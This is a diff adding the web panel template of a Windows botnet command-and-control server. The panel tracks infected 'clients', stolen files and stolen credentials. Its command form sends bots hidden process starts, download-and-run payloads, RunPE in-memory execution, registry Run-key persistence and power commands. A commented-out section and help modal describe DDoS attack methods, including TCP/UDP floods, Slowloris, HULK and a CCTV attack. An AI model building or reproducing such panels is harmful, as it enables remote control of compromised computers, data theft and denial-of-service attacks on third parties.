@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<!--
+This is a starter template page. Use this page to start your new project from
+scratch. This page gets rid of all links and provides the needed markup only.
+-->
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>{{.Name}} | Windows Clients</title>
+    <!-- Google Font: Source Sans Pro -->
+    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback"
+          rel="stylesheet">
+    <!-- Font Awesome Icons -->
+    <link href="../static/css/font-awesome.min.css" rel="stylesheet"/>
+    <link href="../static/css/all.min.css" rel="stylesheet">
+    <!-- Theme style -->
+    <link href="../static/css/adminlte.min.css" rel="stylesheet">
+    <link href="../static/css/dataTables.bootstrap4.min.css" rel="stylesheet">
+    <link href="../static/css/responsive.bootstrap4.min.css" rel="stylesheet">
+    <link href="../static/css/buttons.bootstrap4.min.css" rel="stylesheet">
+    <link href="../static/css/responsive.bootstrap4.min.css" rel="stylesheet">
+    <link href="../static/css/select.bootstrap4.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../static/css/toastr.min.css">
+    <link rel="stylesheet" href="../static/css/daterangepicker.css">
+</head>
+
+<body class="hold-transition dark-mode sidebar-mini">
+<div class="wrapper">
+    <!-- Navbar -->
+    <nav class="main-header navbar navbar-expand navbar-gray-dark navbar-dark">
+        <!-- Left navbar links -->
+        <ul class="navbar-nav">
+            <li class="nav-item">
+                <a class="nav-link" data-widget="pushmenu" href="#" role="button"><i class="fas fa-bars"></i></a>
+            </li>
+
+        </ul>
+
+        <!-- Right navbar links -->
+        <ul class="navbar-nav ml-auto">
+            <li class="nav-item">
+                <a class="nav-link" data-widget="fullscreen" href="#" role="button"><i class="fas fa-expand-arrows-alt">
+                    Full Screen</i></a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="../logout" role="button"><i class="fas fa-sign-out-alt"> Logout</i></a>
+            </li>
+        </ul>
+    </nav>
+    <!-- /.navbar -->
+    <!-- Main Sidebar Container -->
+    <aside class="main-sidebar sidebar-dark-primary elevation-4">
+        <!-- Brand Logo -->
+        <a class="brand-link" href="../"><span class="brand-text font-weight-light"><center>{{.Name}}</center></span></a>
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <!-- Sidebar user panel (optional) -->
+            <div class="user-panel mt-3 pb-3 mb-3 d-flex">
+                <div class="image"><img alt="User Image" class="img-circle elevation-2"
+                                        src="../static/images/avatar6.jpg"></div>
+                <div class="info">
+                    <a class="d-block">{{.Username}}</a>
+                </div>
+            </div>
+            <!-- Sidebar Menu -->
+            <nav class="mt-2">
+                <ul class="nav nav-pills nav-sidebar flex-column" data-accordion="false" data-widget="treeview"
+                    role="menu">
+                    <!-- Add icons to the links using the .nav-icon class with font-awesome or any other icon font library -->
+                    <li class="nav-item">
+                        <a class="nav-link" href="../"><i class="nav-icon fas fa-tachometer-alt"></i>
+                            <p>Dashboard</p></a>
+                    </li>
+                    <li class="nav-item menu-open">
+                        <a href="#" class="nav-link">
+                            <i class="nav-icon fas fa-users"></i>
+                            <p>
+                                Clients
+                                <i class="right fa fa-angle-left"></i>
+                            </p>
+                        </a>
+                        <ul class="nav nav-treeview">
+                            <li class="nav-item">
+                                <a href="../clients/windows" class="nav-link active">
+                                    <i class="nav-icon fab fa-windows"></i>
+                                    <p> Windows</p>
+                                    <i class="right fas fa-angle-left"></i>
+                                </a>
+                            </li>
+                              <li class="nav-item">
+                              <a href="../clients/linux" class="nav-link">
+                                <i class="fab fa-linux nav-icon"></i>
+                                <p>Linux</p>
+                              </a>
+                            </li>
+                        </ul>
+                        <li class="nav-item">
+                        <a href="../ddos" class="nav-link">
+                            <i class="nav-icon fas fa-network-wired"></i>
+                            <p>
+                                DDoS Control
+                            </p>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../socks" class="nav-link">
+                            <i class="nav-icon fas fa-project-diagram"></i>
+                            <p>
+                                Socks & Proxies
+                            </p>
+                        </a>
+                    </li>
+                    <li class="nav-item menu-close">
+                        <a href="#" class="nav-link">
+                            <i class="nav-icon fas fa-tasks"></i>
+                            <p>
+                                Task Management
+                            </p>
+                        </a>
+                        <ul class="nav nav-treeview">
+                            <li class="nav-item">
+                                <a href="./tasks" class="nav-link">
+                                    <i class="nav-icon fas fa-list-ul"></i>
+                                    <p>
+                                        General Tasks
+                                    </p>
+                                </a>
+                            </li>
+                        </ul>
+                        <ul class="nav nav-treeview">
+                            <li class="nav-item">
+                                <a href="./onconnect" class="nav-link">
+                                    <i class="nav-icon fas fa-ethernet"></i>
+                                    <p>
+                                        On Connection Tasks
+                                    </p>
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../settings"><i class="nav-icon fas fa-cogs"></i>
+                            <p>Settings</p></a>
+                    </li>
+                </ul>
+            </nav>
+            <!-- /.sidebar-menu -->
+        </div>
+        <!-- /.sidebar -->
+    </aside>
+    <!-- Content Wrapper. Contains page content -->
+    <!-- Content Wrapper. Contains page content -->
+    <div class="content-wrapper">
+        <!-- Content Header (Page header) -->
+        <div class="content-header">
+            <div class="container-fluid">
+                <div class="row mb-2">
+                    <div class="col-sm-6">
+                        <h1><i class="fab fa-windows"></i> Windows Clients</h1>
+                    </div>
+                    <!-- /.col -->
+                    <div class="col-sm-6">
+                    </div>
+                    <!-- /.col -->
+                </div>
+                <!-- /.row -->
+            </div>
+            <!-- /.container-fluid -->
+        </div>
+        <!-- /.content-header -->
+
+        <!-- Main content -->
+        <div class="content">
+            <div class="container-fluid">
+                <!-- Info boxes -->
+                <div class="row">
+                    <div class="col-12 col-sm-6 col-md-3">
+                        <div class="info-box">
+                            <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-heartbeat"></i></span>
+                            <div class="info-box-content">
+                                <span class="info-box-text">Active Clients</span> <span class="info-box-number">{{.ActiveClients}}</span>
+                            </div>
+                            <!-- /.info-box-content -->
+                        </div>
+                        <!-- /.info-box -->
+                    </div>
+                    <!-- /.col -->
+                    <div class="col-12 col-sm-6 col-md-3">
+                        <div class="info-box mb-3">
+                            <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-archive"></i></span>
+                            <div class="info-box-content">
+                                <span class="info-box-text">Stolen Files</span> <span class="info-box-number">{{.StolenFiles}}</span>
+                            </div>
+                            <!-- /.info-box-content -->
+                        </div>
+                        <!-- /.info-box -->
+                    </div>
+                    <!-- /.col -->
+                    <!-- fix for small devices only -->
+                    <div class="clearfix hidden-md-up"></div>
+                    <div class="col-12 col-sm-6 col-md-3">
+                        <div class="info-box mb-3">
+                            <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-key"></i></span>
+                            <div class="info-box-content">
+                                <span class="info-box-text">Stolen Credentials</span> <span class="info-box-number">{{.StolenCredentials}}</span>
+                            </div>
+                            <!-- /.info-box-content -->
+                        </div>
+                        <!-- /.info-box -->
+                    </div>
+                    <!-- /.col -->
+                    <div class="col-12 col-sm-6 col-md-3">
+                        <div class="info-box mb-3">
+                            <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-database"></i></span>
+                            <div class="info-box-content">
+                                <span class="info-box-text">Total Clients</span> <span class="info-box-number">{{.TotalClients}}</span>
+                            </div>
+                            <!-- /.info-box-content -->
+                        </div>
+                        <!-- /.info-box -->
+                    </div>
+                    <!-- /.col -->
+                </div>
+                <!-- /.row -->
+                <div class="row mb-2">
+                    <div class="col-sm-6"></div>
+                    <!-- /.col -->
+                    <div class="col-sm-6"></div>
+                    <!-- /.col -->
+                </div>
+                <!-- /.row -->
+            </div>
+            <!-- /.container-fluid -->
+        </div>
+        <!-- /.content-header -->
+        <!-- Main content -->
+        <div class="content">
+            <div class="container-fluid">
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title"><i class="fas fa-users"></i> Clients</h3>
+                    </div>
+                    <!-- /.card-header -->
+                    <div class="card-body">
+                        <table class="table table-striped table-borderless dark-mode" id="clientTable">
+                            <thead>
+                            <tr>
+                                <th>IP Address</th>
+                                <th>UID</th>
+                                <th>Version</th>
+                                <th>Operating System</th>
+                                <th>Abilities</th>
+                                <th>Last Response</th>
+                                <th>Options</th>
+                            </tr>
+                            </thead>
+                            <tbody>
+
+                            {{ range .ClientTables}}
+
+                            <tr>
+                                <td>
+                                    <object data="../static/images/flags/{{.ClientFLAG}}.png" type="image/png">
+                                        <img src="../static/images/flags/--.png">
+                                    </object>&nbsp;<a href="https://whatismyipaddress.com/ip/{{.ClientIP}}" target="_blank">{{.ClientIP}}</a>
+                                </td>
+                                <td>{{.ClientUID}}</td>
+                                <td>{{.ClientVersion}}</td>
+                                <td>{{.ClientOS}}</td>
+                                <td>{{.ClientAB}}</td>
+                                <td>{{.ClientLR}}</td>
+                                <td>
+                                    <center>
+                                        <a class="btn btn-primary btn-flat" href="../manage/windows?uid={{.ClientUID}}"><i
+                                                class="fas fa-lg fa-desktop"></i></a> <a
+                                            class="btn btn-primary btn-flat" name="{{.ClientUID}}"
+                                            onclick="deleteClient(this)" href="#"><i class="fas fa-lg fa-trash-alt"></i></a>
+                                    </center>
+                                </td>
+                            </tr>
+
+                            {{ end}}
+
+                            </tbody>
+                        </table>
+                    </div>
+                    <!-- /.card-body -->
+                </div>
+                <!-- /.card -->
+                <div class="row">
+                    <div class="col-lg-6">
+                        <div class="card card-info">
+                            <div class="card-header">
+                                <h3 class="card-title">Issue Command</h3>
+                                <div class="card-tools">
+                                    <button class="btn btn-info bg-gradient-primary" data-target="#modal-default"
+                                            data-toggle="modal" type="button"><i class="fa fa-question"></i></button>
+                                </div>
+                            </div>
+                            <!-- /.card-header -->
+                            <!-- form start -->
+                            <form action="../issue/windows" class="form-horizontal" id="issue" method="post"
+                                  name="issue">
+                                <div class="card-body">
+                                    <div class="form-group" id="windows">
+                                        <label>Command</label> <select class="form-control" id="commandSelect"
+                                                                       name="commandSelect" style="width: 100%;">
+                                        <option disabled selected value="">
+                                            Select a Command
+                                        </option>
+                                        <optgroup label="Client Commands">
+                                            <option data-rn="Kill Client" value="0xKC">
+                                                Kill Client
+                                            </option>
+                                            <option data-rn="Uninstall Client" value="0xUNC">
+                                                Uninstall Client
+                                            </option>
+                                            <option data-rn="Update Client" value="0xUCxP">
+                                                Update Client
+                                            </option>
+                                        </optgroup>
+                                        <optgroup label="Simple Commands">
+                                            <option data-rn="Open URL" value="0xOUxPH">
+                                                Open URL
+                                            </option>
+                                            <option data-rn="Start Process" value="0xSPxPH">
+                                                Start Process
+                                            </option>
+                                            <option data-rn="Download and Run" value="0xDPR">
+                                                Download and Run
+                                            </option>
+                                        </optgroup>
+                                        <optgroup label="Power Commands">
+                                            <option data-rn="Shutdown" value="0xS">
+                                                Shutdown
+                                            </option>
+                                            <option data-rn="Restart" value="0xr">
+                                                Restart
+                                            </option>
+                                            <option data-rn="Lock" value="0xL">
+                                                Lock
+                                            </option>
+                                        </optgroup>
+                                    </select>
+                                    </div>
+                                    <div class="form-group" id="param">
+                                        <label>Parameters</label>
+                                        <textarea class="form-control" id="cparam" placeholder="Parameters"
+                                                  rows="3"></textarea>
+                                    </div>
+
+
+                                    <div class="form-group" id="hidden">
+                                        <div class="form-group">
+                                            <div class="custom-control custom-switch">
+                                                <input type="checkbox" class="custom-control-input" id="hiddencheck">
+                                                <label class="custom-control-label" for="hiddencheck">Hidden</label>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group" id="hidden2">
+                                        <div class="form-group">
+                                            <div class="custom-control custom-switch">
+                                                <input type="checkbox" class="custom-control-input" id="runpecheck">
+                                                <label class="custom-control-label" for="runpecheck">Use RunPE </label>
+                                            </div>
+                                            <div class="custom-control custom-switch">
+                                                <input type="checkbox" class="custom-control-input" id="startupcheck">
+                                                <label class="custom-control-label" for="startupcheck">Add to Startup
+                                                    <code>HKCU Run</code></label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="custom-control custom-switch">
+                                        <input class="custom-control-input" id="sendtoall" type="checkbox"> <label
+                                            class="custom-control-label" for="sendtoall">Send to all Clients</label>
+                                    </div>
+                                </div>
+                                <!-- /.card-body -->
+                                <div class="card-footer">
+                                    <button class="btn btn-primary icon-btn" type="submit"><i
+                                            class="fa fa-fw fa-lg fa-cloud-upload-alt"></i> Issue Command
+                                    </button>&nbsp;&nbsp;&nbsp; &nbsp;<a class="btn btn-danger float-right" href="#"
+                                                                         onclick="resetForm()"><i
+                                        class="fa fa-fw fa-lg fa-times-circle"></i> Clear Form</a>
+                                </div>
+                                <!-- /.card-footer -->
+                            </form>
+                        </div>
+
+                    </div>
+                    <!-- /.card -->
+                    <!--   <div class="col-lg-6">
+                         <div class="card card-info float-right">
+                           <div class="card-header">
+                             <h3 class="card-title">DDoS Control</h3>
+
+                             <div class="card-tools">                  <button class="btn btn-info bg-gradient-primary" data-target="#modal-ddos" data-toggle="modal" type="button"><i class="fa fa-question"></i></button>
+                             </div>
+                           </div>
+
+                           <form action="../issue/windows" class="form-horizontal" id="ddos" method="post" name="ddos">
+                             <div class="card-body">
+                               <div class="form-group" id="dos">
+                                 <div class="input-group">
+                                 <label></label>
+                                 <select class="form-control" id="methodSelect" name="dostype" >
+                                 <option data-rn="TCP Flood" value="0">
+                                   TCP Flood
+                                 </option>
+                                 <option data-rn="UDP Flood" value="1">
+                                   UDP Flood
+                                 </option>
+                                 <option data-rn="Slowloris" value="3">
+                                   Slowloris
+                                 </option>
+                                 <option data-rn="HULK v3" value="4">
+                                   HULK v3
+                                 </option>
+                                   <option data-rn="GoldenEye" value="5">
+                                     GoldenEye
+                                   </option>
+                                   <option data-rn="HTTPS Flood" value="7">
+                                     HTTPS Flood
+                                   </option>
+                                   <option data-rn="CCTV Attack" value="8">
+                                     CCTV Attack
+                                   </option>
+                               </select>
+                                   <label></label>
+                                   <select class="form-control" id="time" name="time" >
+                                     <option data-rn="5 Minutes" value="5">
+                                       5 Minutes
+                                     </option>
+                                     <option data-rn="15 Minutes" value="15">
+                                       15 Minutes
+                                     </option>
+                                     <option data-rn="30 Minutes" value="30">
+                                       30 Minutes
+                                     </option>
+                                     <option data-rn="1 Hours" value="60">
+                                       1 Hours
+                                     </option>
+                                     <option data-rn="2 Hours" value="120">
+                                       2 Hours
+                                     </option>
+                                   </select>
+                                 </div>
+                                 <div class="form-group">
+                                   <label>IP Adress and Port:</label>
+                                   <div class="input-group">
+                                     <div class="input-group-prepend"><span class="input-group-text"><i class="fas fa-laptop"></i></span></div><input type="text" class="form-control" placeholder="xxx.xxx.xxx.xxx" id="ipv4" name="ipv4" data-inputmask="'alias': 'ip'" data-mask="">
+                                     <div class="input-group-prepend"><span class="input-group-text"><i class="fab fa-megaport"></i></span></div><input class="form-control" placeholder="80" type="number" min="5" max="99999" id="port" value="80" name="port">
+                                   </div>
+                                 </div>
+                               </div>
+                               <div class="card-footer">
+                                 <button class="btn btn-primary icon-btn" type="submit"><i class="fa fa-fw fa-lg fa-cloud-upload-alt"></i> Start Attack</button>&nbsp;&nbsp;&nbsp; &nbsp;<a class="btn btn-danger float-right" href="#" onclick="test()"><i class="fa fa-fw fa-lg fa-hand-paper"></i> Emergency Stop</a>
+                               </div>
+                             </div>
+                           </form>
+                         </div>
+                       </div>
+                     </div>
+                   </div>
+                   -->
+                </div>
+            </div>
+
+
+            <!-- /.row -->
+        </div><!-- /.content -->
+    </div><!-- /.content-wrapper -->
+    <!-- Main Footer -->
+    <footer class="main-footer">
+        <!-- To the right -->
+        <div class="float-right d-none d-sm-inline">
+            https://github.com/SaturnsVoid
+        </div>
+        <!-- Default to the left -->
+        <strong><i>"I'm very much a creature of habit."</i></strong> - Eminem
+    </footer>
+</div>
+<!-- ./wrapper -->
+<div class="modal fade" id="modal-default">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title">Issue Command Help</h4>
+                <button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+            <div class="modal-body">
+                <p style="text-align: center;">Advanced Commands Available in the Client Manage Page</p>
+                <h3 style="text-align: center;">Client Commands</h3>
+                <p><strong>Kill Client:</strong> Sends a command to tell the client to kill itself (Turn Off/Close)</p>
+                <p><strong>Uninstall Client:</strong> Will send a command to tell the Client to Uninstall itself from
+                    the Host.</p>
+                <p><strong>Update Client:</strong> Sends a command and link to file for the Client to run and then
+                    Uninstall itself.</p>
+                <p>&nbsp;</p>
+                <h3 style="text-align: center;">Simple Commands</h3>
+                <p><strong>Open URL:</strong> Sends a command to client to open a URL with Options for doing it Hidden.
+                </p>
+                <p><strong>Start Process:&nbsp;</strong>Sends command to client to start a process on the host. Options
+                    for doing it Hidden.</p>
+                <p><strong>Download and Run:</strong> Sends command to client to download and run a file. Options for
+                    Running in Memory and Adding to Windows Startup.</p>
+                <p>&nbsp;</p>
+                <h3 style="text-align: center;">Power Commands</h3>
+                <p><strong>Shutdown:</strong> Sends command to shutdown the Host.</p>
+                <p><strong>Restart:</strong> Sends command to resart the Host.</p>
+                <p><strong>Lock:</strong> Sends command to lock the Host.</p>
+            </div>
+            <div class="modal-footer justify-content-between">
+                <button class="btn btn-default" data-dismiss="modal" type="button">Close</button>
+            </div>
+        </div>
+        <!-- /.modal-content -->
+    </div>
+    <!-- /.modal-dialog -->
+</div>
+<div class="modal fade" id="modal-ddos">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title">DDoS Control Help</h4>
+                <button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+            <div class="modal-body">
+                <p style="text-align: center;">&nbsp;</p>
+                <h3 style="text-align: center;">Attack Methods</h3>
+                <p><strong>TCP Flood:</strong> The most common attack involves sending numerous SYN packets to the
+                    victim.</p>
+                <p><strong>UDP Flood:</strong> Sends UDP packets, typically large ones, to single destination or to
+                    random ports.&nbsp;</p>
+                <p><strong>Slowloris:</strong> Sends HTTP headers to the target site in tiny chunks as slow as possible.
+                </p>
+                <p><strong>HULK v3:</strong> Used to attack web servers by generating unique and obfuscated traffic
+                    volumes.</p>
+                <p><strong>GoldenEye:</strong> A Layer 7 attack using KeepAlive and NoCashe.</p>
+                <p><strong>HTTPS Flood:</strong> Send seemingly legitimate set of HTTPS GET or POST requests.</p>
+                <p><strong>CCTV Attack:</strong> Remotely disable CCTV camera streams, like in spy movies.</p>
+                <h3 style="text-align: center;">Attack Settings</h3>
+                <p><strong>IP Address and Port:</strong> The IP and the Port you wish to attack.</p>
+                <p><strong>Attack Time:</strong> How long the Attack will last. You may lose connection to the Client
+                    while attacking.</p>
+            </div>
+            <div class="modal-footer justify-content-between">
+                <button class="btn btn-default" data-dismiss="modal" type="button">Close</button>
+            </div>
+        </div>
+        <!-- /.modal-content -->
+    </div>
+    <!-- /.modal-dialog -->
+</div>
+<!-- REQUIRED SCRIPTS -->
+<!-- jQuery -->
+<script src="../static/js/jquery.js">
+</script>
+<!-- Bootstrap 4 -->
+<script src="../static/js/bootstrap.bundle.min.js">
+</script>
+<!-- AdminLTE App -->
+<script src="../static/js/adminlte.min.js">
+</script>
+<script src="../static/js/jquery.dataTables.min.js">
+</script>
+<script src="../static/js/dataTables.bootstrap4.min.js">
+</script>
+<script src="../static/js/dataTables.buttons.min.js">
+</script>
+<script src="../static/js/buttons.bootstrap4.min.js">
+</script>
+<script src="../static/js/pdfmake.min.js">
+</script>
+<script src="../static/js/buttons.html5.min.js">
+</script>
+<script src="../static/js/dataTables.select.min.js">
+</script>
+<script src="../static/js/sweetalert2.all.js">
+</script>
+<script src="../static/js/toastr.min.js"></script>
+<script src="../static/js/moment.min.js"></script>
+<script src="../static/js/jquery.inputmask.min.js"></script>
+
+
+<script>
+    function resetForm() {
+        jQuery("#param").hide()
+        jQuery("#dos").hide()
+        jQuery("#hidden").hide()
+        jQuery("#hidden2").hide()
+        jQuery("#runpecheck").hide()
+
+        document.getElementById("issue").reset();
+    }
+
+    jQuery(function () {
+        jQuery("#param").hide()
+        jQuery("#hidden").hide()
+        jQuery("#hidden2").hide()
+        jQuery("#runpecheck").hide()
+
+//var rc = event.target.options[event.target.selectedIndex].dataset.rc;
+    });
+
+    jQuery("#commandSelect").change(function () {
+        var value = jQuery(this).val();
+        if (value.includes("P")) {
+            $("#param").show();
+        } else {
+            jQuery("#param").hide()
+        }
+        if (value.includes("H")) {
+            $("#hidden").show();
+        } else {
+            jQuery("#hidden").hide()
+        }
+        if (value.includes("R")) {
+            $("#hidden2").show();
+        } else {
+            jQuery("#hidden2").hide()
+        }
+        if (value.includes("E")) {
+            $("#runpecheck").show();
+        } else {
+            jQuery("#runpecheck").hide()
+        }
+    });
+
+    $(function () {
+        $("#clientTable").DataTable({
+            "responsive": true, "lengthChange": false, "autoWidth": false, "order": [[5, "desc"]],
+            select: {
+                style: 'multi'
+            },
+            buttons: [
+                {
+                    extend: 'collection',
+                    text: '<i class="fas fa-file-download"> Export<\/i>',
+                    buttons: [
+                        {
+                            extend: 'copyHtml5',
+                            text: '<i class="far fa-copy"> Copy<\/i>',
+                            titleAttr: 'Copy'
+                        },
+                        {
+                            extend: 'csvHtml5',
+                            text: '<i class="fa fa-table"> CVS<\/i>',
+                            titleAttr: 'CVS'
+                        }
+                    ]
+                }
+            ]
+        }).buttons().container().appendTo('#clientTable_wrapper .col-md-6:eq(0)');
+
+    });
+
+    function deleteClient(UID) {
+        var id = UID.name
+        Swal.fire({
+            title: 'Delete clients Data?',
+            html: "<h3>Are you sure that you want to delete this clients data? </h3> <i>The client will need to register with the C2 again.</i>",
+            showCancelButton: true,
+            confirmButtonText: `Delete`,
+        }).then((result) => {
+            if (result.isConfirmed) {
+                $.ajax({
+                    url: '../delete/client/windows',
+                    type: 'POST',
+                    data: 'id=' + id,
+                    dataType: 'json'
+                })
+                Swal.fire('Deleted!', 'All the clients data was deleted.', 'success')
+                setTimeout("location.reload(true);", 2000);
+            } else if (result.dismiss) {
+                Swal.fire('Canceled', 'Nothing lost... Accept maybe some time.', 'info')
+            }
+        })
+    }
+
+    var ipv4_address = $('#ipv4');
+    ipv4_address.inputmask({
+        alias: "ip",
+        greedy: false //The initial mask shown will be "" instead of "-____".
+    });
+
+    function test() {
+        var table = $('#clientTable').DataTable();
+        var selectedclients = table.rows('.selected').data()
+        var data = selectedclients.rows({selected: true}).data();
+        var newarray = [];
+        for (var i = 0; i < data.length; i++) {
+            newarray.push(data[i][1]);
+        }
+        var sData = newarray.join();
+
+        alert(sData)
+    }
+
+    $('#issue').submit(function (event) {
+        //console.log("Issue command called")
+        event.preventDefault();
+        var table = $('#clientTable').DataTable();
+        var data = table.rows({selected: true}).data();
+        var newarray = [];
+        for (var i = 0; i < data.length; i++) {
+            newarray.push(data[i][1]);
+        }
+        var sData = newarray.join();
+        var selectedCommand = $("#commandSelect").val();
+        var sel = document.getElementById('commandSelect');
+        var selected = sel.options[sel.selectedIndex];
+        var realname = selected.getAttribute('data-rn');
+        var commandPara = $("#cparam").val();
+        var hiddencheck;
+        if ($("#hiddencheck").is(":checked")) {
+            hiddencheck = "true";
+        } else {
+            hiddencheck = "false";
+        }
+        var runpecheck;
+        if ($("#runpecheck").is(":checked")) {
+            runpecheck = "true";
+        } else {
+            runpecheck = "false";
+        }
+        var startupcheck;
+        if ($("#startupcheck").is(":checked")) {
+            startupcheck = "true";
+        } else {
+            startupcheck = "false";
+        }
+        var sendtoall;
+        sendtoall = sData;
+        if ($("#sendtoall").is(":checked")) {
+            sendtoall = "true";
+        }
+        if (sData.length === 0 && sendtoall !== "true") {
+            Swal.fire('Error', 'Please select clients to issue command to or Select All. ', 'error');
+            return;
+        }
+        if (selectedCommand.length === 0) {
+            Swal.fire('Error', 'You did not select a command to issue. ', 'error');
+            return;
+        }
+
+
+        $.ajax({
+            type: "POST",
+            url: "../issue/windows",
+            //data: "cmd=" + selectedCommand + "&real=" + realname + "&para=" + commandPara + "&hidden=" + hiddencheck + "&runpe=" + runpecheck + "&startup=" + startupcheck + "&to=" + sendtoall,
+            data: "cmd=" + selectedCommand + "&real=" + realname + "&para=" + commandPara + "|" + startupcheck + "|" + "HKCU" + "|" + runpecheck + "|" + "C:\\Windows\\System32\\calc.exe\\" + "|" + hiddencheck + "&to=" + sendtoall,
+            success: function (text) {
+                console.log(text)
+                if (text == "success") {
+                    Swal.fire('Command Issued!', 'Command was issued to the clients.', 'success')
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire('Oops...', 'Something went wrong but nothing was lost.', 'error');
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", 'Unknown Error: ' + text, "error")
+                }
+            }
+        });
+    });
+
+    toastr.options = {
+        "closeButton": true,
+        "debug": false,
+        "newestOnTop": true,
+        "progressBar": true,
+        "positionClass": "toast-top-right",
+        "preventDuplicates": true,
+        "onclick": null,
+        "showDuration": "300",
+        "hideDuration": "1000",
+        "timeOut": "5000",
+        "extendedTimeOut": "1000",
+        "showEasing": "swing",
+        "hideEasing": "linear",
+        "showMethod": "fadeIn",
+        "hideMethod": "fadeOut"
+    }
+
+    window.onload = function () {
+        let conn;
+        let last;
+
+        if (window["WebSocket"]) {
+            conn = new WebSocket("wss://" + document.location.host + "/live");
+            conn.onopen = function () {
+                console.log("Live Agent: Connected");
+                conn.send("ping");
+            };
+            conn.onclose = function (evt) {
+                console.log("Live Agent: Connection Closed (" + evt.code + ")");
+            };
+            conn.onmessage = function (evt) {
+                if (evt.data.length >= 1) {
+                    if(evt.data === "pong") {
+                        setTimeout(function(){
+                            conn.send("ping");
+                        }, 2000);
+                    }else{
+                        if (evt.data !== last) {
+                            last = evt.data;
+                            const words = evt.data.split("|");
+                            console.log("Live Agent:  " + words[1] + " " + words[1]);
+                            if (words[0] === "info") {
+                                toastr.info(words[1], words[2]);
+                            }
+                            if (words[0] === "success") {
+                                toastr.success(words[1], words[2]);
+                            }
+                            if (words[0] === "error") {
+                                toastr.error(words[1], words[2]);
+                            }
+                        }
+                    }
+                }
+            };
+        } else {
+            alert("Your browser does not support WebSockets. Do to this you will not get Live Notifications.");
+        }
+    };
+</script>
+</body>
+
+</html>
